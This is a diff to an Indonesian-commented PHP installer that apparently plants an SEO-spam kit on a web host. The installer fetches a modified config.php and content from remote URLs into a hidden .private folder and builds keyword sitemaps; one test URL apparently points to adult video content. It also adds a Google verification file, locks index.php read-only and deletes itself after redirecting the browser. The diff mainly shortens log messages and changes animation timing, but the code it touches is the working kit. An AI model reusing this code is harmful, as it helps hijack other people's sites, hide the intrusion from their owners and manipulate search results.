@@ -7,9 +7,9 @@ $self_script_name = basename($_SERVER['PHP_SELF']);
 $server_path = dirname(__FILE__);
 
 // Logika domain
+$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
 $host = $_SERVER['HTTP_HOST'] ?? 'default-domain.com';
 $clean_host = str_replace('www.', '', $host);
-$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
 $full_domain_url = $protocol . $host; // Domain lengkap DENGAN www jika ada
 
 // URL Download
@@ -87,9 +87,9 @@ function buat_robots_txt($domain) {
  * TAHAP 2: Dijalankan setelah form disubmit
  */
 function jalankan_instalasi() {
-    global $clean_host, $full_domain_url, $server_path, $self_script_name,
+    global $clean_host, $server_path, $self_script_name,
            $config_url, $local_config_path, $keyword_url, $base_content_url_path,
-           $local_sitemap_path, $local_json_content_path;
+           $local_sitemap_path, $local_json_content_path, $protocol; // Ambil global protocol
 
     // 1. Ambil input dari form
     if (!isset($_GET['json_file']) || empty(trim($_GET['json_file']))) {
@@ -104,59 +104,59 @@ function jalankan_instalasi() {
     $derived_keyword_url = $keyword_url; 
 
     $logs = [
-        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Melanjutkan proses instalasi...']
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Proses instalasi...']
     ];
     
     // 2. Unduh Konten JSON (Data)
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh file konten JSON dari: ' . htmlspecialchars($derived_content_url)];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Unduh JSON: ' . htmlspecialchars($derived_content_url)];
     $json_content = fetchRawUrl($derived_content_url);
     if ($json_content !== false && !empty($json_content)) {
         if (@file_put_contents($local_json_content_path, $json_content)) {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'File konten disimpan secara lokal di: .private/content.json'];
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'JSON disimpan ke .private/content.json'];
         } else {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal menyimpan .private/content.json. Periksa izin folder.'];
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal simpan .private/content.json. Cek izin folder.'];
             tampilkan_log_terminal($logs, 'final_error'); return;
         }
     } else {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh file JSON dari URL. Proses dibatalkan.'];
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal unduh JSON. Proses dibatalkan.'];
         tampilkan_log_terminal($logs, 'final_error'); return;
     }
 
     // 3. Unduh config.php (Logika)
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh config.php yang sudah dimodifikasi dari GitHub...'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Unduh config.php dari GitHub...'];
     $config_content = fetchRawUrl($config_url);
     if ($config_content !== false && !empty($config_content)) {
         if (@file_put_contents($local_config_path, $config_content)) {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'config.php disimpan di: .private/config.php'];
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'config.php disimpan.'];
         } else {
-             $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal menyimpan config.php. Periksa izin folder .private.'];
+             $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal simpan config.php. Cek izin .private.'];
         }
     } else {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh config.php. Periksa URL di $config_url.'];
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal unduh config.php. Cek URL $config_url.'];
         tampilkan_log_terminal($logs, 'final_error'); return;
     }
     
     // 4. Buat robots.txt
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Membuat robots.txt...'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Buat robots.txt...'];
     if (buat_robots_txt($clean_host)) {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'robots.txt berhasil dibuat di root.'];
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'robots.txt dibuat.'];
     } else {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal membuat robots.txt.'];
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal buat robots.txt.'];
     }
     
     // 5. Buat Sitemap
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh keywords dari (default.txt): ' . htmlspecialchars($derived_keyword_url)];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Unduh keywords (default.txt)...'];
     $keywords = fetchKeywordsFromUrl($derived_keyword_url, []);
     if (empty($keywords)) {
-         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh keywords atau file TXT kosong. Sitemap tidak akan dibuat.'];
+         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal unduh keywords. Sitemap tidak dibuat.'];
          tampilkan_log_terminal($logs, 'final_error'); return;
     }
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Ditemukan ' . count($keywords) . ' keywords. Mulai membuat sitemap...'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Found ' . count($keywords) . ' keywords. Buat sitemap...'];
     $total_keywords = count($keywords);
-    $base_url = $protocol . $clean_host;
+    $base_url = $protocol . $clean_host; // Perbaikan (Request 1)
     $now = date('Y-m-d\TH:i:s+07:00');
     $urls_per_map = 10000;
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengatur batas ' . $urls_per_map . ' URL per file sitemap.'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Set batas ' . $urls_per_map . ' URL/sitemap.'];
     $num_maps = ceil($total_keywords / $urls_per_map);
     if ($num_maps == 0) $num_maps = 1;
     for ($i = 1; $i <= $num_maps; $i++) {
@@ -167,7 +167,7 @@ function jalankan_instalasi() {
         $xml_sub = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
         $xml_sub .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
         foreach ($keywords_chunk as $keyword) {
-            $url = $base_url . '/index.php?id=' . htmlspecialchars(urlencode($keyword));
+            $url = $base_url . '/index.php?id=' . htmlspecialchars(urlencode($keyword)); // Perbaikan (Request 1)
             $xml_sub .= '  <url><loc>' . $url . '</loc><lastmod>' . $now . '</lastmod></url>' . PHP_EOL;
         }
         $xml_sub .= '</urlset>' . PHP_EOL;
@@ -176,24 +176,24 @@ function jalankan_instalasi() {
     $xml_index = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
     $xml_index .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
     for ($i = 1; $i <= $num_maps; $i++) {
-        $map_url = $base_url . '/sitemap-' . $i . '.xml';
+        $map_url = $base_url . '/sitemap-' . $i . '.xml'; // Perbaikan (Request 1)
         $xml_index .= '  <sitemap><loc>' . htmlspecialchars($map_url) . '</loc><lastmod>' . $now . '</lastmod></sitemap>' . PHP_EOL;
     }
     $xml_index .= '</sitemapindex>' . PHP_EOL;
     @file_put_contents($local_sitemap_path, $xml_index);
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => "Sitemap index (sitemap.xml) dan $num_maps sub-sitemap (sitemap-*.xml) dibuat."];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => "Sitemap index & $num_maps sub-sitemap dibuat."];
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Instalasi Selesai.'];
 
     // 6. Chmod index.php
     $index_path = $server_path . '/index.php';
     if (@chmod($index_path, 0444)) {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Permission index.php diubah ke 0444 (read-only).'];
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'index.php -> 0444 (read-only).'];
     } else {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengubah permission index.php. Lakukan manual.'];
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal chmod index.php. Lakukan manual.'];
     }
 
     // 7. Lanjut ke TAHAP 3 (Prompt Cek Redirect & Salin)
-    tampilkan_prompt_cek_redirect($logs, $full_domain_url);
+    tampilkan_prompt_cek_redirect($logs);
 }
 
 /**
@@ -203,38 +203,38 @@ function tampilkan_halaman_installer() {
     global $clean_host, $cache_dir, $google_html_url, $local_google_path, $self_script_name;
 
     $logs = [
-        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Memulai instalasi...'],
-        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mendeteksi domain: ' . $clean_host]
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mulai...'],
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Domain: ' . $clean_host]
     ];
 
     // 1. Buat folder .private
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Memeriksa folder .private...'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Cek folder .private...'];
     if (!is_dir($cache_dir)) {
         if (!@mkdir($cache_dir, 0755, true)) {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'FATAL: Gagal membuat folder .private. Periksa izin folder root.'];
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'FATAL: Gagal buat .private. Cek izin.'];
             tampilkan_log_terminal($logs, 'final_error'); return;
         } else {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Folder .private dibuat.'];
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => '.private dibuat.'];
         }
     } else {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'Folder .private sudah ada.'];
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => '.private sudah ada.'];
     }
 
     // 2. Unduh Google HTML
     $google_file_name = basename($local_google_path);
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh ' . $google_file_name . '...'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Unduh ' . $google_file_name . '...'];
     $google_content = fetchRawUrl($google_html_url);
     if ($google_content !== false && !empty($google_content)) {
         if (@file_put_contents($local_google_path, $google_content)) {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => $google_file_name . ' disimpan di root (untuk verifikasi GSC).'];
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => $google_file_name . ' disimpan (untuk GSC).'];
         } else {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal menyimpan ' . $google_file_name . '. Periksa izin root.'];
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal simpan ' . $google_file_name . '. Cek izin.'];
         }
     } else {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh ' . $google_file_name . '.'];
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal unduh ' . $google_file_name . '.'];
     }
 
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Sistem siap. Menunggu input...'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Siap. Menunggu input...'];
 
     // Tampilkan Terminal UI dengan log di atas, DAN form input
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Installer</title>
@@ -305,15 +305,15 @@ function tampilkan_halaman_installer() {
                 if (currentChar < log.message.length) {
                     messageElement.textContent += log.message[currentChar];
                     currentChar++;
-                    setTimeout(typeNextChar, 8);
+                    setTimeout(typeNextChar, 2); // Animasi cepat
                 } else {
                     messageElement.classList.remove("typing");
                     currentChar = 0;
                     currentLog++;
-                    setTimeout(typeNextChar, 50);
+                    setTimeout(typeNextChar, 10); // Jeda cepat
                 }
             }
-            setTimeout(typeNextChar, 200);
+            setTimeout(typeNextChar, 100);
         </script>
     </body>
     </html>';
@@ -322,17 +322,16 @@ function tampilkan_halaman_installer() {
 /**
  * TAHAP 3: Tampilkan log instalasi, tunggu Enter untuk Cek Redirect & Salin
  */
-function tampilkan_prompt_cek_redirect($logs, $full_domain_url) {
-    global $self_script_name;
+function tampilkan_prompt_cek_redirect($logs) {
+    global $self_script_name, $full_domain_url;
     // URL untuk tes redirect
     $test_url = $full_domain_url . '/index.php?id=wanz-895-english-subtitle';
     
-    // Tambahkan log baru untuk prompt SALIN & CEK
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Domain Anda: ' . htmlspecialchars($full_domain_url)];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Domain: ' . htmlspecialchars($full_domain_url)];
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER untuk:'];
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '1. Membuka Tab Baru (Cek Redirect)'];
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '2. Menyalin Domain ke Clipboard'];
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '3. Lanjut ke tahap Hapus File...'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '1. Salin Domain'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '2. Cek Redirect (Tab Baru)'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '3. Lanjut Hapus...'];
 
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Cek Redirect & Salin Domain</title>
     <style>
@@ -371,25 +370,27 @@ function tampilkan_prompt_cek_redirect($logs, $full_domain_url) {
         
         function typeNextChar() {
             if (currentLog >= logs.length) {
-                // Tampilkan prompt terakhir
                 container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
-                // Tambahkan event listener untuk Enter
                 document.addEventListener("keydown", function(e) {
                     if (e.key === "Enter") {
                         e.preventDefault(); 
                         
-                        // 1. Buka Tab Baru (Cek Redirect)
-                        window.open(\'' . $test_url . '\', \'_blank\');
-                        
-                        // 2. Coba Salin
+                        // PERMINTAAN 2: Salin DULU, baru buka tab
                         try {
-                            navigator.clipboard.writeText(\'' . $full_domain_url . '\');
+                            navigator.clipboard.writeText(\'' . $full_domain_url . '\').then(() => {
+                                // Sukses copy, buka tab & redirect
+                                window.open(\'' . $test_url . '\', \'_blank\');
+                                window.location.href = \'' . $self_script_name . '?action=confirm_delete\';
+                            }).catch(err => {
+                                // Gagal copy, tapi tetap lanjut
+                                window.open(\'' . $test_url . '\', \'_blank\');
+                                window.location.href = \'' . $self_script_name . '?action=confirm_delete\';
+                            });
                         } catch (err) {
-                            // Gagal tidak apa-apa, lanjut
+                            // Gagal (misal http), tetap lanjut
+                            window.open(\'' . $test_url . '\', \'_blank\');
+                            window.location.href = \'' . $self_script_name . '?action=confirm_delete\';
                         }
-                        
-                        // 3. Lanjut ke TAHAP 4 (Konfirmasi Hapus)
-                        window.location.href = \'' . $self_script_name . '?action=confirm_delete\';
                     }
                 }, { once: true }); 
                 return;
@@ -406,17 +407,16 @@ function tampilkan_prompt_cek_redirect($logs, $full_domain_url) {
             if (currentChar < log.message.length) {
                 messageElement.textContent += log.message[currentChar];
                 currentChar++;
-                setTimeout(typeNextChar, 8);
+                setTimeout(typeNextChar, 2); // Animasi cepat
             } else {
                 messageElement.classList.remove("typing");
                 currentChar = 0;
                 currentLog++;
-                setTimeout(typeNextChar, 50);
+                setTimeout(typeNextChar, 10); // Jeda cepat
             }
         }
         
-        // Langsung mulai typing
-        setTimeout(typeNextChar, 200); 
+        setTimeout(typeNextChar, 100); 
     </script>
     </body></html>';
 }
@@ -428,10 +428,10 @@ function tampilkan_prompt_hapus() {
     global $self_script_name;
     // Log untuk TAHAP 4
     $logs = [
-        ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Domain berhasil disalin ke clipboard!'],
-        ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'PERINGATAN: Pastikan Anda telah verifikasi domain di Google Search Console!'],
-        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'File (v*.php, google...html, ' . $self_script_name . ') akan dihapus permanen.'],
-        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER untuk KONFIRMASI PENGHAPUSAN...']
+        ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Domain disalin ke clipboard!'],
+        ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'PERINGATAN: Pastikan GSC sudah diverifikasi!'],
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'File installer akan dihapus permanen.'],
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER UNTUK HAPUS.']
     ];
 
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Konfirmasi Hapus</title>
@@ -471,13 +471,10 @@ function tampilkan_prompt_hapus() {
         
         function typeNextChar() {
             if (currentLog >= logs.length) {
-                // Tampilkan prompt terakhir
                 container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
-                // Tambahkan event listener untuk Enter
                 document.addEventListener("keydown", function(e) {
                     if (e.key === "Enter") {
                         e.preventDefault(); 
-                        // Lanjut ke TAHAP 5 (PENGHAPUSAN)
                         window.location.href = \'' . $self_script_name . '?action=cleanup\';
                     }
                 }, { once: true }); 
@@ -495,17 +492,16 @@ function tampilkan_prompt_hapus() {
             if (currentChar < log.message.length) {
                 messageElement.textContent += log.message[currentChar];
                 currentChar++;
-                setTimeout(typeNextChar, 8);
+                setTimeout(typeNextChar, 2); // Animasi cepat
             } else {
                 messageElement.classList.remove("typing");
                 currentChar = 0;
                 currentLog++;
-                setTimeout(typeNextChar, 50);
+                setTimeout(typeNextChar, 10); // Jeda cepat
             }
         }
         
-        // Langsung mulai typing
-        setTimeout(typeNextChar, 200); 
+        setTimeout(typeNextChar, 100); 
     </script>
     </body></html>';
 }
@@ -523,16 +519,11 @@ function jalankan_penghapusan_terakhir() {
         'google8f39414e57a5615a.html'
     ];
 
-    // --- PERMINTAAN 3: Redirect ke domain root ---
     // Kirim JavaScript redirect ke browser SEBELUM menghapus file
     echo "<!DOCTYPE html><html><head><title>Pembersihan Selesai</title></head><body>";
     echo "<p>Pembersihan selesai. Mengalihkan ke halaman utama...</p>";
-    echo "<script>window.location.href = '" . $full_domain_url . "';</script>";
+    echo "<script>window.location.href = '" . $full_domain_url . "';</script>"; // Redirect ke root domain
     echo "</body></html>";
-    // --- Akhir Permintaan 3 ---
-
-    // Lanjutkan proses penghapusan di server
-    // (Pesan log ini tidak akan terlihat oleh user karena browser sudah dialihkan)
     
     // Pastikan output terkirim ke browser sebelum lanjut
     if (function_exists('fastcgi_finish_request')) {
@@ -611,15 +602,15 @@ function tampilkan_log_terminal($logs, $next_action = 'done') {
             if (currentChar < log.message.length) {
                 messageElement.textContent += log.message[currentChar];
                 currentChar++;
-                setTimeout(typeNextChar, 8);
+                setTimeout(typeNextChar, 2); // Animasi cepat
             } else {
                 messageElement.classList.remove("typing");
                 currentChar = 0;
                 currentLog++;
-                setTimeout(typeNextChar, 50);
+                setTimeout(typeNextChar, 10); // Jeda cepat
             }
         }
-        setTimeout(typeNextChar, 200);
+        setTimeout(typeNextChar, 100);
     </script>
     </body></html>';
 }
